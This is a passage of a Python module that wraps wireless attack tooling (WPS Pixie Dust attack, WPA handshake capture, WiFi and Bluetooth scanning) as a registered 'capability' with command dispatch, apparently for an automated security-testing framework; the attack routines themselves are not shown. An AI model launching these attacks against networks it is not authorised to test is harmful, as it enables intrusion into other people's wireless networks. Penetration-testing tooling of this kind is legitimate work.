            description="Wireless attack tools including WiFi, WPS, and Bluetooth",
            capability_type=CapabilityType.NETWORK_SCANNER,
            version="1.0.0",
            author="AIVA Team",
            tags=["wireless", "wifi", "wps", "bluetooth", "penetration-testing"]
        )
        self.manager = WirelessManager()
        self.initialized = False
    
    async def initialize(self) -> bool:
        """初始化能力"""
        try:
            logger.info("Initializing wireless attack capability...")
            
            # 檢查是否有 root 權限
            if os.geteuid() != 0:
                logger.warning("Not running as root. Some features may not work.")
                console.print("[warning]⚠️  未以 root 權限運行，部分功能可能無法使用[/warning]")
            
            # 檢查必需的系統工具
            required_tools = ['aircrack-ng', 'airmon-ng', 'airodump-ng', 'aireplay-ng']
            missing_tools = []
            
            for tool in required_tools:
                try:
                    result = subprocess.run(
                        ['which', tool],
                        capture_output=True,
                        timeout=5
                    )
                    if result.returncode != 0:
                        missing_tools.append(tool)
                except Exception:
                    missing_tools.append(tool)
            
            if missing_tools:
                logger.warning(f"Missing required tools: {', '.join(missing_tools)}")
                console.print(
                    f"[warning]⚠️  缺少必需工具: {', '.join(missing_tools)}[/warning]\n"
                    "[yellow]請安裝 aircrack-ng: sudo apt-get install aircrack-ng[/yellow]"
                )
            
            # 檢查無線網卡
            interface = await self.manager.wifi_scanner.check_interface()
            if not interface:
                logger.warning("No wireless interface found")
                console.print("[warning]⚠️  未找到無線網卡[/warning]")
            
            self.initialized = True
            logger.info("Wireless attack capability initialized successfully")
            return True
            
        except Exception as e:
            logger.error(f"Failed to initialize wireless attack capability: {e}")
            return False
    
    async def execute(self, command: str, parameters: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        執行命令
        
        支持的命令:
        - interactive_menu: 啟動交互式選單
        - scan_wifi: 掃描 WiFi 網絡
        - wps_attack: 執行 WPS 攻擊
        - capture_handshake: 捕獲握手包
        - scan_bluetooth: 掃描藍牙設備
        - install_tool: 安裝工具
        - check_tool: 檢查工具狀態
        """
        if not self.initialized:
            await self.initialize()
        
        parameters = parameters or {}
        
        try:
            if command == "interactive_menu":
                await self.manager.interactive_menu()
                return {"success": True, "message": "Interactive menu completed"}
            
            elif command == "scan_wifi":
                duration = parameters.get("duration", 30)
                networks = await self.manager.wifi_scanner.scan_networks(duration)
                return {
                    "success": True,
                    "networks": [asdict(n) for n in networks],
                    "count": len(networks)
                }
            
            elif command == "wps_attack":
                target_index = parameters.get("target_index")
                if target_index is None:
                    return {"success": False, "error": "Missing target_index parameter"}
                
                if not self.manager.wifi_scanner.networks:
                    return {"success": False, "error": "No networks scanned. Run scan_wifi first"}
                
                if not 0 <= target_index < len(self.manager.wifi_scanner.networks):
                    return {"success": False, "error": "Invalid target_index"}
                
                target = self.manager.wifi_scanner.networks[target_index]
                result = await self.manager.wps_attack.pixie_dust_attack(target)
                
                return {
                    "success": result.success,
                    "result": result.to_dict()
                }
            
            elif command == "capture_handshake":
                target_index = parameters.get("target_index")
                timeout = parameters.get("timeout", 120)
                
                if target_index is None:
                    return {"success": False, "error": "Missing target_index parameter"}
                
                if not self.manager.wifi_scanner.networks:
                    return {"success": False, "error": "No networks scanned. Run scan_wifi first"}
                
                if not 0 <= target_index < len(self.manager.wifi_scanner.networks):
                    return {"success": False, "error": "Invalid target_index"}
                
                target = self.manager.wifi_scanner.networks[target_index]
                result = await self.manager.handshake_capture.capture_handshake(target, timeout)
                
                return {
                    "success": result.success,
                    "result": result.to_dict()
                }
            
            elif command == "scan_bluetooth":
                duration = parameters.get("duration", 30)
                devices = await self.manager.bluetooth_scanner.scan_bluetooth_devices(duration)
                return {
                    "success": True,
                    "devices": [asdict(d) for d in devices],
                    "count": len(devices)
                }
            
            elif command == "install_tool":
                tool_name = parameters.get("tool_name")
                if not tool_name:
                    return {"success": False, "error": "Missing tool_name parameter"}
                
                tool = next((t for t in self.manager.tools if t.TITLE.lower() == tool_name.lower()), None)
                if not tool:
                    return {
                        "success": False,
                        "error": f"Tool '{tool_name}' not found",
                        "available_tools": [t.TITLE for t in self.manager.tools]
                    }
                
                success = await tool.install()
                return {
                    "success": success,
                    "tool": tool.TITLE,
                    "installed": tool.is_installed()
                }
            
            elif command == "check_tool":
                tool_name = parameters.get("tool_name")
                
                if tool_name:
                    tool = next((t for t in self.manager.tools if t.TITLE.lower() == tool_name.lower()), None)
                    if not tool:
                        return {"success": False, "error": f"Tool '{tool_name}' not found"}
                    
                    return {
                        "success": True,
                        "tool": {
                            "name": tool.TITLE,
                            "installed": tool.is_installed(),
                            "description": tool.DESCRIPTION,
                            "project_url": tool.PROJECT_URL
                        }
                    }
                else:
                    # 檢查所有工具
                    tools_status = []
                    for tool in self.manager.tools:
                        tools_status.append({
                            "name": tool.TITLE,
                            "installed": tool.is_installed(),
                            "description": tool.DESCRIPTION,
                            "project_url": tool.PROJECT_URL
                        })
                    
                    return {
                        "success": True,
                        "tools": tools_status
                    }
            
            else:
                return {
                    "success": False,
                    "error": f"Unknown command: {command}",
                    "available_commands": [
                        "interactive_menu",
                        "scan_wifi",
                        "wps_attack",
                        "capture_handshake",
                        "scan_bluetooth",
                        "install_tool",
                        "check_tool"
                    ]
                }
                
        except Exception as e:
            logger.error(f"Error executing command '{command}': {e}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def cleanup(self) -> bool:
        """清理資源"""
        try:
            logger.info("Cleaning up wireless attack capability...")
            
            # 停用監控模式
            await self.manager.wifi_scanner.disable_monitor_mode()
            
            self.initialized = False
            logger.info("Wireless attack capability cleaned up successfully")
            return True
            
        except Exception as e:
            logger.error(f"Error during cleanup: {e}")
            return False
    
    def get_info(self) -> Dict[str, Any]:
        """獲取能力信息"""
        return {
            "name": self.name,
            "description": self.description,
            "type": self.capability_type.value,
            "version": self.version,
            "author": self.author,
            "tags": self.tags,
            "initialized": self.initialized,
            "supported_commands": [
                {
                    "name": "interactive_menu",
                    "description": "啟動交互式選單",
                    "parameters": []
                },
                {
                    "name": "scan_wifi",
                    "description": "掃描 WiFi 網絡",
                    "parameters": [
                        {"name": "duration", "type": "int", "default": 30, "description": "掃描時長（秒）"}
                    ]
                },
                {
                    "name": "wps_attack",
                    "description": "執行 WPS Pixie Dust 攻擊",
                    "parameters": [
                        {"name": "target_index", "type": "int", "required": True, "description": "目標網絡索引"}
                    ]
                },
                {
                    "name": "capture_handshake",
                    "description": "捕獲 WPA/WPA2 握手包",
                    "parameters": [
                        {"name": "target_index", "type": "int", "required": True, "description": "目標網絡索引"},
                        {"name": "timeout", "type": "int", "default": 120, "description": "超時時間（秒）"}
                    ]
                },
                {
                    "name": "scan_bluetooth",
                    "description": "掃描藍牙設備",
                    "parameters": [
                        {"name": "duration", "type": "int", "default": 30, "description": "掃描時長（秒）"}
                    ]
                },
                {
                    "name": "install_tool",
                    "description": "安裝指定工具",
                    "parameters": [
                        {"name": "tool_name", "type": "str", "required": True, "description": "工具名稱"}
                    ]
                },
                {
                    "name": "check_tool",
                    "description": "檢查工具安裝狀態",
                    "parameters": [
                        {"name": "tool_name", "type": "str", "required": False, "description": "工具名稱（不提供則檢查所有）"}
                    ]
                }
            ],
            "available_tools": [
                {
                    "name": tool.TITLE,
                    "description": tool.DESCRIPTION,
                    "installed": tool.is_installed(),
                    "project_url": tool.PROJECT_URL
                }
                for tool in self.manager.tools
            ]
        }


# ===== 註冊能力 =====
CapabilityRegistry.register("wireless_attack_tools", WirelessCapability)


# ===== 測試代碼 =====
async def main():
    """測試入口"""
    capability = WirelessCapability()
    
    # 初始化
    if not await capability.initialize():
        console.print("[error]❌ 初始化失敗[/error]")
        return
    
    try:
        # 啟動交互式選單
        result = await capability.execute("interactive_menu")
        console.print(f"\n[purple]執行結果:[/purple] {result}")
    finally:
        # 清理
        await capability.cleanup()


if __name__ == "__main__":
    asyncio.run(main())
